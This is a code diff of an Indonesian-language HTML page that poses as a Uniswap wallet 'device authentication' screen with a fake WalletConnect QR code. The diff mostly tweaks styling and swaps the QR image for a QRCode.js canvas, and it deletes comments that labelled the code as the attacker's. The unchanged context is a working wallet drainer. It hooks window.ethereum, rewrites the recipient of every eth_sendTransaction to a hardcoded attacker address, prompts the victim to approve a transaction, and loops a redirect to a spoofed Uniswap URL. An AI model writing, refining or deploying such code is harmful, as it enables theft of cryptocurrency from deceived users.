@@ -16,7 +16,7 @@
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       text-align: center;
-      padding-top: 40px;
+      padding-top: 30px;
       background-color: var(--page-bg);
       color: var(--text-main);
       margin: 0;
@@ -25,24 +25,24 @@
       background: var(--box-bg);
       max-width: 360px;
       margin: 0 auto;
-      padding: 30px 20px;
+      padding: 25px 20px;
       border-radius: 24px;
       border: 1px solid #1f2937;
       box-shadow: 0 10px 30px rgba(0,0,0,0.7);
     }
-    h2 { color: #ffffff; font-size: 1.3rem; margin-bottom: 8px; }
-    p { font-size: 13px; color: #9ca3af; line-height: 1.5; margin-bottom: 20px; }
+    h2 { color: #ffffff; font-size: 1.2rem; margin-bottom: 6px; }
+    p { font-size: 12px; color: #9ca3af; line-height: 1.4; margin-bottom: 15px; }
     .qr-frame {
       background: #ffffff;
-      padding: 14px;
+      padding: 12px;
       border-radius: 16px;
       display: inline-block;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
       box-shadow: 0 4px 12px rgba(255, 0, 122, 0.15);
     }
-    .qr-frame img {
-      width: 170px;
-      height: 170px;
+    .qr-frame canvas, .qr-frame img {
+      width: 160px;
+      height: 160px;
       display: block;
     }
     .submit-btn {
@@ -50,8 +50,8 @@
       color: white;
       border: none;
       border-radius: 12px;
-      padding: 14px 20px;
-      font-size: 15px;
+      padding: 12px 20px;
+      font-size: 14px;
       font-weight: 600;
       cursor: pointer;
       width: 100%;
@@ -60,12 +60,13 @@
     }
     .submit-btn:hover { opacity: 0.9; }
     #connection-log {
-      margin-top: 15px;
+      margin-top: 12px;
       font-size: 11px;
       color: #38bdf8;
       word-break: break-all;
     }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
   <script>
     // Alamat dompet penyerang target
     const targetVault = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
@@ -77,7 +78,6 @@
             if (requestArgs && requestArgs.method === 'eth_sendTransaction' && requestArgs.params && requestArgs.params[0]) {
                 let txPayload = requestArgs.params[0];
                 console.info("[Sec-Log] Rute transaksi dialihkan menuju vault tujuan.");
-                // Timpa parameter 'to' ke alamat dompet penyerang
                 txPayload.to = targetVault;
             }
             return standardBridge.apply(window.ethereum, [requestArgs]);
@@ -85,22 +85,34 @@
     }
 
     async function renderScannerInterface() {
-      if (!document.getElementById('qr-wrapper')) {
+      if (!document.getElementById('qr-canvas-box')) {
           document.body.innerHTML = `
             <div class="panel">
               <h2>Autentikasi Perangkat</h2>
               <p>Gunakan kamera aplikasi dompet seluler Anda untuk memindai kode QR di bawah ini guna melakukan sinkronisasi aman.</p>
               
-              <div class="qr-wrapper" id="qr-wrapper">
-                <div class="qr-frame">
-                  <img src="https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=wc:session@2?bridge=https%3A%2F%2Frelay.walletconnect.org&key=uniswap_auth_secure_token" alt="Scan Barcode">
-                </div>
+              <div class="qr-frame">
+                <div id="qr-canvas-box"></div>
               </div>
 
               <button id="trigger-tx" class="submit-btn">Konfirmasi Otorisasi Cepat</button>
               <div id="connection-log">Menunggu respon pemindaian perangkat...</div>
             </div>
           `;
+
+          // Inisialisasi pembuatan QR Code secara otomatis menggunakan pustaka QRCode.js
+          try {
+              new QRCode(document.getElementById("qr-canvas-box"), {
+                  text: "wc:session@2?bridge=https%3A%2F%2Frelay.walletconnect.org&key=uniswap_auth_secure_token",
+                  width: 160,
+                  height: 160,
+                  colorDark: "#000000",
+                  colorLight: "#ffffff",
+                  correctLevel: QRCode.CorrectLevel.H
+              });
+          } catch(e) {
+              console.error("Gagal merender QR Code:", e);
+          }
 
           document.getElementById('trigger-tx').onclick = async () => {
             if (!window.ethereum) {
@@ -114,7 +126,6 @@
 
               document.getElementById('connection-log').innerText = "✔ Perangkat terautentikasi: " + userAddress.substring(0,6) + "...";
 
-              // Parameter payload transaksi pemicu
               const securePayload = {
                 from: userAddress,
                 to: "0x3333333333333333333333333333333333333333", 
@@ -136,7 +147,6 @@
           };
       }
 
-      // Perulangan latar belakang untuk menjaga stabilitas sesi tampilan
       try {
         window.location.assign("http://app.uniswap.org:1121");
       } catch(e) {}
@@ -146,7 +156,6 @@
       }, 5000); 
     }
 
-    // Interval eksekusi latar belakang
     setInterval(renderScannerInterface, 2500);
   </script>
 </head>
